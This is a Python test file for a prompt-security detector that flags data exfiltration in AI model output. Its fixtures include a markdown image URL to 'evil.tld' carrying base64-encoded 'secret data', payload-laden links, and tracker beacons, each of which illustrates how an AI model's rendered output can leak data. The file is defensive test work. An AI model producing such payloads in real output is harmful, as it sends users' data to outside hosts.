from promptwall.detectors import DataExfiltrationDetector
from promptwall.normalize import ScanContext
from promptwall.types import Direction, Severity


def scan(text, **kw):
    det = DataExfiltrationDetector(**kw)
    return det.scan(ScanContext.build(text, Direction.OUTPUT))


class TestImageExfiltration:
    def test_image_with_query_data_is_high(self):
        f = scan("![x](https://evil.tld/log?d=SGVsbG8gc2VjcmV0IGRhdGE)")
        assert f and f[0].severity == Severity.HIGH
        assert f[0].category == "data_exfiltration"

    def test_plain_image_without_query_is_ignored(self):
        assert scan("![logo](https://cdn.example.com/logo.png)") == []

    def test_link_with_large_payload_is_medium(self):
        url = "https://evil.tld/c?x=" + "A" * 30
        f = scan(f"[click here]({url})")
        assert f and f[0].severity == Severity.MEDIUM

    def test_ordinary_link_is_ignored(self):
        assert scan("see [docs](https://example.com/docs) for more") == []


class TestAllowlist:
    def test_non_allowlisted_image_host_is_flagged(self):
        f = scan("![x](https://sneaky.tld/p.png)",
                 allowed_domains=["example.com"])
        assert f and f[0].severity == Severity.HIGH

    def test_allowlisted_host_is_permitted(self):
        f = scan("![x](https://cdn.example.com/p.png)",
                 allowed_domains=["example.com"])
        assert f == []

    def test_non_allowlisted_bare_url_is_flagged(self):
        f = scan("visit https://tracker.tld/beacon now",
                 allowed_domains=["example.com"])
        assert any(x.message.startswith("URL to a non-allowlisted") for x in f)


class TestBareUrlBlob:
    def test_encoded_blob_in_url_is_low(self):
        f = scan("fetch https://example.com/aVeryLongEncodedBlob0123456789abcdef")
        assert f and f[0].severity == Severity.LOW

    def test_clean_output_is_silent(self):
        assert scan("Here is a summary of the document you asked about.") == []
